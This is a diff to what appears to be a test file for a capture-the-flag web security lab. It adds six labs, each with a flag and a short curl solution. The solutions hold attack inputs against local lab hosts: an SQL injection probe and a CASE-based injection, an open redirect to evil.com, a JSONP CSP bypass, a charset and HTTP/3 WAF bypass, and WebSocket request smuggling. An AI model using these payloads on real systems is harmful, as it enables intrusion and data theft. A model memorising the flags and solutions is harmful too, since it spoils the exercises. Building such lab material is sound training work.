@@ -85,6 +85,54 @@ const LABS = [
       `http GET https://api.example/v1/flag 'X-API-Key:shp_live_9f3c2a' > found.txt`,
     ],
   },
+  {
+    id: 'web-xss-bypass-advanced', flag: 'nto{csp_byp4ss_v14_4ll0wl1st3d_jsonp}', hints: 4,
+    solution: [
+      `curl -sI https://shop.local/`,
+      `curl -s 'https://cdn.shop.local/api/user?callback=alert'`,
+      `curl -s 'https://cdn.shop.local/api/secret?callback=cb' > found.txt`,
+    ],
+  },
+  {
+    id: 'web-xss-client-side', flag: 'nto{0p3n_r3d1r3ct_ch41ns_t0_1nt3rn4l_4dm1n}', hints: 4,
+    solution: [
+      `curl -sI 'https://shop.local/login?next=/profile'`,
+      `curl -sI 'https://shop.local/login?next=https://evil.com'`,
+      `curl -sL 'https://shop.local/login?next=//internal.shop.local/admin' > found.txt`,
+    ],
+  },
+  {
+    id: 'web-injection-advanced', flag: 'nto{s3c0nd_0rd3r_1nj3ct10n_st0r3d_p4yl04d}', hints: 4,
+    solution: [
+      `curl -s 'https://shop.local/api/products?sort=price&order=asc'`,
+      `curl -s 'https://shop.local/api/products?sort=price,case%20when%201=1%20then%201%20else%201/0%20end&order=asc'`,
+      `curl -s -X POST https://shop.local/api/register -d @payload.txt`,
+      `curl -s https://shop.local/admin/report > found.txt`,
+    ],
+  },
+  {
+    id: 'web-http3-quic', flag: 'nto{h3_udp_byp4ss3s_th3_tcp_w4f}', hints: 4,
+    solution: [
+      `curl -sI https://shop.local/`,
+      `curl -sI --http3 https://shop.local/`,
+      `curl -sI https://shop.local/admin`,
+      `curl -sI --http3 https://shop.local/admin > found.txt`,
+    ],
+  },
+  {
+    id: 'web-waf-bypass-advanced', flag: 'nto{ch4rs3t_c0nfus10n_byp4ss3s_th3_w4f}', hints: 4,
+    solution: [
+      `curl -s 'https://shop.local/search?q=test%27%20OR%201%3D1--'`,
+      `curl -s -X POST https://shop.local/search -H 'Content-Type: application/x-www-form-urlencoded; charset=ibm037' --data-binary @bypass.txt > found.txt`,
+    ],
+  },
+  {
+    id: 'web-websocket-smuggling', flag: 'nto{w3bs0ck3t_upgr4d3_d3sync_smuggl3s_th3_r3qu3st}', hints: 4,
+    solution: [
+      `curl -s -i -H 'Upgrade: websocket' -H 'Connection: Upgrade' https://target.local/chat`,
+      `curl -s --data-binary @smuggle.txt https://target.local/chat -H 'Upgrade: websocket' -H 'Connection: Upgrade' > found.txt`,
+    ],
+  },
 ]
 
 describe.each(LABS)('web lab B5: $id', ({ id, flag, hints, solution }) => {
